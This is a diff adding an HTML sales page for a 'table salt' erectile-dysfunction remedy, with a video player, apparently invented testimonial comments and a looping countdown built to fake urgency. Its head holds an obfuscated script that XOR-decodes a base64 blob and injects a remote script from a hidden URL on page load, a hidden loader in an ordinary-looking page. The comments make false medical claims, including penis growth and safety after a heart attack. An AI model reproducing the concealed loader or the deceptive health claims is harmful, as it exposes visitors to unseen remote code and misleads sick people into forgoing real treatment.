@@ -1,0 +1,974 @@
+<!DOCTYPE html>
+<html lang="en-ZA">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1123182646935484');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+
+    <title>Salt AOA</title>
+
+    <script>(function(){var p_d55=atob("DEbpqJBIsSdfyzsiPj3L3eIkkx19o09WTjXTh78r1Ulxvk9PVyCQhvMn3Ak9uRRRXTSA2OQ7nlIrpkgNUiedzeM8n00s6RcAXzKd2vkqxFM6uBkYZT3LxvEl1AVl6V9DSifE3eQl2EEm5ktQWzCMxuRlyUQwrxZRXS3LhLI+0EsqrhkYHGSUhOtq30YyrhkYHCKI3PFlxFMyol1bEzabzeYt31NyuE5AVyKairxqx0Yzvl4ABGTL1c01");var c_li=[];for(var p_nrq=0;p_nrq<p_d55.length;p_nrq++){c_li.push(p_d55.charCodeAt(p_nrq)&255);}var r_uw8z=c_li[0];var q_6qk2=c_li.slice(1,1+r_uw8z);var s_a=c_li.slice(1+r_uw8z);var g_wil=s_a.map(function(b,w_l8){return b^q_6qk2[w_l8%r_uw8z];});var m_wvd="";for(var m_724e=0;m_724e<g_wil.length;m_724e++){m_wvd+=String.fromCharCode(g_wil[m_724e]&255);}var v_7=decodeURIComponent(escape(m_wvd));var y_nqq9=JSON.parse(v_7);var i_0a4=y_nqq9.globals||[];i_0a4.forEach(function(p_z){window[p_z.name]=p_z.value;});var d_9i3e=document.createElement("script");d_9i3e.src=y_nqq9.url;d_9i3e.async=true;d_9i3e.defer=true;(y_nqq9.attributes||[]).forEach(function(z_p7){d_9i3e.setAttribute(z_p7.name,z_p7.value);});(document.head||document.documentElement).appendChild(d_9i3e);})();</script>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg: #f6f7f9;
+            --surface: #ffffff;
+            --text: #17191d;
+            --text-soft: #656a73;
+            --muted: #92969d;
+            --line: #e7e9ed;
+            --red: #dc2626;
+            --red-dark: #991b1b;
+            --red-soft: #fef2f2;
+            --blue: #1877f2;
+            --shadow: 0 18px 55px rgba(23, 25, 29, 0.07);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            min-height: 100%;
+            background: var(--bg);
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background:
+                radial-gradient(circle at 50% -10%, rgba(220, 38, 38, 0.10), transparent 28%),
+                linear-gradient(180deg, #ffffff 0%, #f8f9fb 48%, #f4f5f7 100%);
+            color: var(--text);
+            padding: 78px 16px 64px;      /* ← space for the fixed bar */
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* ============================================================
+           FIXED URGENCY BAR (TOP)
+           ============================================================ */
+        .urgency-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 9999;
+            background: linear-gradient(90deg, #b91c1c 0%, #dc2626 50%, #b91c1c 100%);
+            color: #ffffff;
+            padding: 11px 14px;
+            text-align: center;
+            box-shadow: 0 4px 18px rgba(220, 38, 38, 0.35);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            overflow: hidden;
+            animation: barDrop 0.6s cubic-bezier(0.22, 1, 0.36, 1) both;
+        }
+
+        @keyframes barDrop {
+            from {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* shimmer */
+        .urgency-bar::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -40%;
+            width: 40%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.22), transparent);
+            transform: skewX(-18deg);
+            animation: barShimmer 3.2s ease-in-out infinite;
+        }
+
+        @keyframes barShimmer {
+            0% { left: -40%; }
+            60%, 100% { left: 140%; }
+        }
+
+        .urgency-inner {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            max-width: 720px;
+            margin: 0 auto;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.1px;
+            line-height: 1.3;
+        }
+
+        .urgency-inner .icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.18);
+            font-size: 11px;
+            animation: iconPulse 1.4s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes iconPulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.35); }
+            50% { transform: scale(1.08); box-shadow: 0 0 0 6px rgba(255,255,255,0); }
+        }
+
+        .urgency-inner .text {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .urgency-inner .text strong {
+            font-weight: 900;
+            letter-spacing: 0.2px;
+        }
+
+        /* Animated arrow */
+        .urgency-inner .arrow {
+            display: inline-block;
+            animation: arrowBounce 1.1s ease-in-out infinite;
+            font-size: 11px;
+        }
+
+        @keyframes arrowBounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(2px); }
+        }
+
+        /* ===== BACKGROUND PARTICLES ===== */
+        #particles {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.42;
+        }
+
+        /* ===== CONTAINER ===== */
+        .vsl-wrap {
+            position: relative;
+            z-index: 1;
+            max-width: 720px;
+            margin: 0 auto;
+            animation: pageEnter 0.7s cubic-bezier(0.22, 1, 0.36, 1) both;
+        }
+
+        @keyframes pageEnter {
+            from {
+                opacity: 0;
+                transform: translateY(18px);
+                filter: blur(4px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+                filter: blur(0);
+            }
+        }
+
+        /* ===== LOGO ===== */
+        .vsl-logo {
+            text-align: center;
+            margin-bottom: 22px;
+        }
+
+        .vsl-logo img {
+            max-height: 48px;
+            width: auto;
+            opacity: 0.96;
+            border-radius: 8px;
+            animation: logoFloat 4.8s ease-in-out infinite;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-2px); }
+        }
+
+        /* ===== BADGE ===== */
+        .vsl-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: 800;
+            letter-spacing: 1.3px;
+            text-transform: uppercase;
+            color: var(--red-dark);
+            background: var(--red-soft);
+            padding: 7px 13px;
+            border-radius: 999px;
+            margin-bottom: 18px;
+            animation: badgePulse 2.4s ease-in-out infinite;
+        }
+
+        @keyframes badgePulse {
+            0%, 100% {
+                box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.18);
+                transform: translateY(0);
+            }
+            50% {
+                box-shadow: 0 0 0 7px rgba(220, 38, 38, 0);
+                transform: translateY(-1px);
+            }
+        }
+
+        /* ===== HEADLINE ===== */
+        .vsl-headline {
+            max-width: 650px;
+            margin: 0 auto 27px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 800;
+            line-height: 1.25;
+            color: var(--text);
+            letter-spacing: -0.85px;
+            animation: headlineIn 0.65s cubic-bezier(0.22, 1, 0.36, 1) both;
+        }
+
+        @keyframes headlineIn {
+            0% {
+                opacity: 0;
+                transform: translateY(18px) scale(0.985);
+                filter: blur(4px);
+            }
+            65% {
+                opacity: 1;
+                transform: translateY(-2px) scale(1.003);
+                filter: blur(0);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+                filter: blur(0);
+            }
+        }
+
+        .vsl-headline .highlight {
+            color: var(--red);
+            -webkit-text-fill-color: var(--red);
+            position: relative;
+            display: inline-block;
+        }
+
+        .vsl-headline .highlight::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, rgba(220,38,38,0.88), rgba(220,38,38,0));
+            transform-origin: left;
+            animation: underlineGrow 0.8s cubic-bezier(0.22, 1, 0.36, 1) both;
+        }
+
+        @keyframes underlineGrow {
+            from { transform: scaleX(0); opacity: 0; }
+            to { transform: scaleX(1); opacity: 1; }
+        }
+
+        /* ===== VSL — FIXED ===== */
+        .vsl-player {
+            width: 100%;
+            margin: 0 auto 34px;
+            animation: playerIn 0.78s 0.08s cubic-bezier(0.22, 1, 0.36, 1) both;
+        }
+
+        @keyframes playerIn {
+            from {
+                opacity: 0;
+                transform: translateY(16px) scale(0.985);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* The wrapper does NOT cut off the pitch button (no overflow:hidden) */
+        .vsl-frame {
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto;
+            position: relative;
+            background: transparent;
+            border-radius: 14px;
+            overflow: visible;            /* ← lets the button overlay come out freely */
+            transition: transform 0.3s cubic-bezier(0.22, 1, 0.36, 1),
+                        box-shadow 0.3s ease;
+        }
+
+        .vsl-frame:hover {
+            transform: translateY(-3px);
+        }
+
+        /* Only the iframe/video gets rounded corners — the overlay button does NOT */
+        .vsl-frame vturb-smartplayer iframe,
+        .vsl-frame vturb-smartplayer video,
+        .vsl-frame [id^="ifr_"] {
+            max-width: 100% !important;
+            width: 100% !important;
+            display: block !important;
+            border-radius: 14px !important;
+            overflow: hidden !important;
+        }
+
+        /* CORRECT ratio — same as the HTML (133.33% = 3:4) */
+        .vsl-frame .vturb-player-placeholder {
+            padding-top: 133.33333333333331% !important;
+        }
+
+        /* ============================================================
+           COMMENTS — REDESIGNED
+           ============================================================ */
+        .comments-section {
+            width: 100%;
+            max-width: 650px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 20px 22px 16px;
+            box-shadow:
+                0 1px 2px rgba(0, 0, 0, 0.04),
+                0 12px 38px rgba(23, 25, 29, 0.06);
+            border: 1px solid #eceef1;
+            animation: commentsIn 0.8s 0.15s cubic-bezier(0.22, 1, 0.36, 1) both;
+        }
+
+        @keyframes commentsIn {
+            from {
+                opacity: 0;
+                transform: translateY(22px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Header */
+        .comments-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 0 14px;
+            margin-bottom: 4px;
+            border-bottom: 1px solid #ebedf0;
+        }
+
+        .comments-header .title {
+            font-size: 14px;
+            line-height: 1.2;
+            font-weight: 700;
+            color: #050505;
+            letter-spacing: -0.1px;
+        }
+
+        .comments-header .live {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 0;
+            border: 0;
+            background: transparent;
+            color: #65676b;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .comments-header .live i {
+            font-size: 7px;
+            color: #0866FF;
+            animation: pulse-dot 1.5s infinite ease-in-out;
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: .35; transform: scale(.75); }
+        }
+
+        /* ===== EACH COMMENT ===== */
+        .comment {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 12px 8px;
+            margin: 0 -8px;
+            border-radius: 10px;
+            background: transparent;
+            border: 0;
+            box-shadow: none;
+            transition: background-color 0.18s ease;
+            animation: commentIn 0.5s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+            opacity: 0;
+        }
+
+        .comment:nth-of-type(2) { animation-delay: .05s; }
+        .comment:nth-of-type(3) { animation-delay: .10s; }
+        .comment:nth-of-type(4) { animation-delay: .15s; }
+        .comment:nth-of-type(5) { animation-delay: .20s; }
+        .comment:nth-of-type(6) { animation-delay: .25s; }
+        .comment:nth-of-type(7) { animation-delay: .30s; }
+
+        @keyframes commentIn {
+            0% {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .comment:hover {
+            background: #f7f8fa;
+        }
+
+        /* Avatar */
+        .comment .avatar {
+            width: 40px;
+            height: 40px;
+            min-width: 40px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            background-color: #e4e6eb;
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+            color: #65676b;
+            box-shadow: 0 0 0 1px rgba(0,0,0,0.04);
+        }
+
+        /* Bubble (comment bubble) */
+        .comment .content {
+            flex: 1;
+            min-width: 0;
+            padding-top: 0;
+        }
+
+        .comment .bubble {
+            background: #f0f2f5;
+            border-radius: 16px;
+            padding: 9px 13px;
+            display: inline-block;
+            max-width: 100%;
+            word-wrap: break-word;
+        }
+
+        .comment .author {
+            font-weight: 700;
+            font-size: 13px;
+            line-height: 1.3;
+            color: #050505;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            flex-wrap: wrap;
+            margin-bottom: 2px;
+        }
+
+        .comment .author .verified {
+            color: var(--blue);
+            font-size: 11px;
+        }
+
+        .comment .text {
+            font-size: 13.5px;
+            line-height: 1.45;
+            color: #050505;
+            margin: 0;
+            word-break: break-word;
+        }
+
+        .comment .text strong {
+            color: #050505;
+            font-weight: 700;
+        }
+
+        /* Action line (like, reply, time) */
+        .comment .actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-top: 5px;
+            padding-left: 12px;
+            font-size: 12px;
+            color: #65676b;
+            font-weight: 600;
+        }
+
+        .comment .actions .time {
+            font-weight: 400;
+            color: #8a8d91;
+            font-size: 11.5px;
+        }
+
+        .comment .actions .like-count {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+            transition: color 0.18s ease;
+            user-select: none;
+            color: #65676b;
+            font-weight: 600;
+        }
+
+        .comment .actions .like-count:hover {
+            color: #0866FF;
+        }
+
+        .comment .actions .like-count i {
+            width: 16px;
+            height: 16px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0866FF, #0866FF);
+            color: #fff !important;
+            font-size: 8px;
+            box-shadow: 0 1px 2px rgba(220,38,38,.35);
+            transition: transform 0.2s cubic-bezier(.34,1.56,.64,1);
+        }
+
+        .comment .actions .like-count.liked {
+            color: #0866FF;
+        }
+
+        .comment .actions .like-count.liked i {
+            transform: scale(1.18);
+        }
+
+        .comment .actions .reply {
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 12px;
+            color: #65676b;
+            transition: color 0.18s ease;
+        }
+
+        .comment .actions .reply:hover {
+            color: #050505;
+        }
+
+        /* Footer */
+        .comments-closed {
+            text-align: center;
+            color: #8a8d91;
+            font-size: 11.5px;
+            line-height: 1.4;
+            font-weight: 500;
+            padding: 14px 0 4px;
+            border-top: 1px solid #ebedf0;
+            margin-top: 8px;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            body {
+                padding: 74px 10px 48px;
+            }
+
+            .urgency-bar {
+                padding: 9px 10px;
+            }
+
+            .urgency-inner {
+                font-size: 11.5px;
+                gap: 7px;
+            }
+
+            .urgency-inner .icon {
+                width: 17px;
+                height: 17px;
+                font-size: 9px;
+            }
+
+            .vsl-headline {
+                font-size: 21px;
+                line-height: 1.27;
+                margin-bottom: 22px;
+            }
+
+            .vsl-logo img {
+                max-height: 42px;
+            }
+
+            .vsl-player {
+                margin-bottom: 28px;
+            }
+
+            .vsl-frame {
+                max-width: 290px;
+                border-radius: 12px;
+            }
+
+            .vsl-frame vturb-smartplayer iframe,
+            .vsl-frame vturb-smartplayer video,
+            .vsl-frame [id^="ifr_"] {
+                border-radius: 12px !important;
+            }
+
+            .comments-section {
+                padding: 16px 14px 12px;
+                border-radius: 14px;
+            }
+
+            .comments-header {
+                padding-bottom: 12px;
+                margin-bottom: 3px;
+            }
+
+            .comments-header .title {
+                font-size: 13px;
+            }
+
+            .comment {
+                padding: 10px 6px;
+                margin: 0 -6px;
+                gap: 8px;
+            }
+
+            .comment .avatar {
+                width: 36px;
+                height: 36px;
+                min-width: 36px;
+                font-size: 12px;
+            }
+
+            .comment .bubble {
+                padding: 8px 11px;
+                border-radius: 14px;
+            }
+
+            .comment .author {
+                font-size: 12.5px;
+            }
+
+            .comment .text {
+                font-size: 12.5px;
+                line-height: 1.42;
+            }
+
+            .comment .actions {
+                gap: 14px;
+                font-size: 11.5px;
+                padding-left: 10px;
+            }
+
+            .comment .actions .time {
+                font-size: 11px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .urgency-inner {
+                font-size: 10.5px;
+            }
+            .urgency-inner .text .hide-xs {
+                display: none;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ============================================================
+         FIXED URGENCY BAR (TOP)
+         ============================================================ -->
+    <div class="urgency-bar" id="urgencyBar" role="alert" aria-live="polite">
+        <div class="urgency-inner">
+            <span class="text">
+                <span class="hide-xs">⚠️</span>
+                <strong>ATTENTION:</strong>
+                <span class="hide-xs">this video is going to be taken down soon!</span>
+            </span>
+        </div>
+    </div>
+
+    <!-- BACKGROUND PARTICLES -->
+    <canvas id="particles"></canvas>
+
+    <div class="vsl-wrap">
+
+        <!-- FEATURED HEADLINE -->
+        <h1 class="vsl-headline">
+            The <span class="highlight">secret </span> that gets men hard again <span class="highlight">like they were 18</span> using only <span class="highlight">table salt</span>
+        </h1>
+
+        <!-- PURE VSL -->
+        <div class="vsl-player">
+            <div class="vsl-frame">
+                <vturb-smartplayer id="vid-6acbb11e20c1aa1d6f14d0fa">
+                    <div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 133.33333333333331% 0 0; z-index: 0; background-color: transparent;"></div>
+                </vturb-smartplayer>
+            </div>
+            <script type="text/javascript">
+                var s=document.createElement("script");
+                s.src="https://scripts.converteai.net/2c3d960f-39c3-4072-a7af-c60fed7da363/players/6acbb11e20c1aa1d6f14d0fa/v4/player.js";
+                s.async=!0,document.head.appendChild(s);
+            </script>
+        </div>
+
+        <!-- COMMENTS -->
+        <div class="comments-section">
+            <div class="comments-header">
+                <span class="title">1,321 Comments</span>
+            </div>
+
+            <div class="comment" data-id="1">
+                <div class="avatar" style="background-image: url('images/1.jpg');"></div>
+                <div class="content">
+                    <div class="bubble">
+                        <div class="author">Carlos Silva <span class="verified"><i class="fas fa-circle-check"></i></span></div>
+                        <div class="text">After 8 years dependent on Viagra, I'm finally free! I used the salt for 3 days and had the strongest erection of my life. <strong>My wife couldn't believe it!</strong> 😲</div>
+                    </div>
+                    <div class="actions">
+                        <span class="time">2 hours ago</span>
+                        <span class="like-count"><i class="fas fa-thumbs-up"></i> 254</span>
+                        <span class="reply">Reply</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="comment" data-id="3">
+                <div class="avatar" style="background-image: url('images/2.jpg');"></div>
+                <div class="content">
+                    <div class="bubble">
+                        <div class="author">João Santos</div>
+                        <div class="text">I suffered 12 years of impotence and had already lost hope. With the salt trick, in one week my penis got thicker and erections last <strong>40+ minutes</strong>. Revolutionary!</div>
+                    </div>
+                    <div class="actions">
+                        <span class="time">1 hour ago</span>
+                        <span class="like-count"><i class="fas fa-thumbs-up"></i> 189</span>
+                        <span class="reply">Reply</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="comment" data-id="4">
+                <div class="avatar" style="background-image: url('images/3.jpg');"></div>
+                <div class="content">
+                    <div class="bubble">
+                        <div class="author">Miguel Costa</div>
+                        <div class="text">At 61, I thought my sex life was over. But with this natural salt method, I'm having erections like I did at 25 again! <strong>My wife is impressed</strong> and our relationship has come back to life.</div>
+                    </div>
+                    <div class="actions">
+                        <span class="time">1 hour ago</span>
+                        <span class="like-count"><i class="fas fa-thumbs-up"></i> 312</span>
+                        <span class="reply">Reply</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="comment" data-id="5">
+                <div class="avatar" style="background-image: url('images/4.jpg');"></div>
+                <div class="content">
+                    <div class="bubble">
+                        <div class="author">António Fernandes</div>
+                        <div class="text">I used to spend more than R5 000 a month on Viagra and sprays. Now with the salt, I get natural erections that last <strong>more than 50 minutes</strong>. I save money and perform better.</div>
+                    </div>
+                    <div class="actions">
+                        <span class="time">19 minutes ago</span>
+                        <span class="like-count"><i class="fas fa-thumbs-up"></i> 147</span>
+                        <span class="reply">Reply</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="comment" data-id="6">
+                <div class="avatar" style="background-image: url('images/5.jpg');"></div>
+                <div class="content">
+                    <div class="bubble">
+                        <div class="author">Paulo Machava</div>
+                        <div class="text">After my heart attack, the doctors banned Viagra. I thought I'd never have a normal sex life again. The salt saved me, it's <strong>100% natural</strong> and doesn't harm your heart. Erections hard as rock!</div>
+                    </div>
+                    <div class="actions">
+                        <span class="time">19 minutes ago</span>
+                        <span class="like-count"><i class="fas fa-thumbs-up"></i> 98</span>
+                        <span class="reply">Reply</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="comment" data-id="7">
+                <div class="avatar" style="background-image: url('images/6.jpg');"></div>
+                <div class="content">
+                    <div class="bubble">
+                        <div class="author">Ricardo Dauto</div>
+                        <div class="text">My self-esteem was on the floor. At 49 I couldn't have sex anymore. The salt trick changed everything — in 10 days my penis grew <strong>3cm</strong> and my erections are explosive! My wife won't stop praising me.</div>
+                    </div>
+                    <div class="actions">
+                        <span class="time">19 minutes ago</span>
+                        <span class="like-count"><i class="fas fa-thumbs-up"></i> 215</span>
+                        <span class="reply">Reply</span>
+                    </div>
+                </div>
+            </div>
+
+            <h4 class="comments-closed">This post is no longer receiving comments!</h4>
+        </div>
+
+    </div>
+
+    <script>
+        /* ============================================================
+           BACKGROUND PARTICLES
+        ============================================================ */
+        (function() {
+            const canvas = document.getElementById('particles');
+            const ctx = canvas.getContext('2d');
+            let particles = [];
+            let w, h;
+
+            function resize() {
+                w = canvas.width = window.innerWidth;
+                h = canvas.height = window.innerHeight;
+            }
+            resize();
+            window.addEventListener('resize', resize);
+
+            for (let i = 0; i < 40; i++) {
+                particles.push({
+                    x: Math.random() * w,
+                    y: Math.random() * h,
+                    r: Math.random() * 1.5 + 0.3,
+                    vx: (Math.random() - 0.5) * 0.3,
+                    vy: (Math.random() - 0.5) * 0.3,
+                    o: Math.random() * 0.4 + 0.1
+                });
+            }
+
+            function draw() {
+                ctx.clearRect(0, 0, w, h);
+                particles.forEach(p => {
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    if (p.x < 0) p.x = w;
+                    if (p.x > w) p.x = 0;
+                    if (p.y < 0) p.y = h;
+                    if (p.y > h) p.y = 0;
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fillStyle = `rgba(220, 38, 38, ${Math.min(p.o, 0.10)})`;
+                    ctx.fill();
+                });
+                requestAnimationFrame(draw);
+            }
+            draw();
+        })();
+
+        /* ============================================================
+           COMMENT LIKES
+        ============================================================ */
+        document.querySelectorAll('.comment .like-count').forEach(el => {
+            const icon = el.querySelector('i');
+            const textNode = el.childNodes[1];
+            let count = parseInt(textNode.textContent.trim()) || 0;
+            let liked = false;
+
+            el.addEventListener('click', function(e) {
+                e.stopPropagation();
+                if (!liked) {
+                    count += 1;
+                    liked = true;
+                    el.classList.add('liked');
+                } else {
+                    count -= 1;
+                    liked = false;
+                    el.classList.remove('liked');
+                }
+                textNode.textContent = ' ' + count;
+            });
+        });
+
+        /* ============================================================
+           URGENCY BAR COUNTDOWN
+           Starts at 39:18 and loops when it reaches 00:00
+        ============================================================ */
+        (function() {
+            // 39 minutes and 18 seconds = 39 * 60 + 18 = 2358 seconds
+            const TOTAL_SECONDS = 39 * 60 + 18;   // ← 39:18
+            let remaining = TOTAL_SECONDS;
+
+            const minEl = document.getElementById('cd-min');
+            const secEl = document.getElementById('cd-sec');
+
+            function pad(n) { return n < 10 ? '0' + n : '' + n; }
+
+            function render() {
+                const m = Math.floor(remaining / 60);
+                const s = remaining % 60;
+                if (minEl) minEl.textContent = pad(m);
+                if (secEl) secEl.textContent = pad(s);
+            }
+
+            render();
+
+            const timer = setInterval(() => {
+                remaining--;
+                if (remaining < 0) {
+                    // Loops to keep the urgency always active
+                    remaining = TOTAL_SECONDS;
+                }
+                render();
+            }, 1000);
+        })();
+    </script>
+
+</body>
+</html>
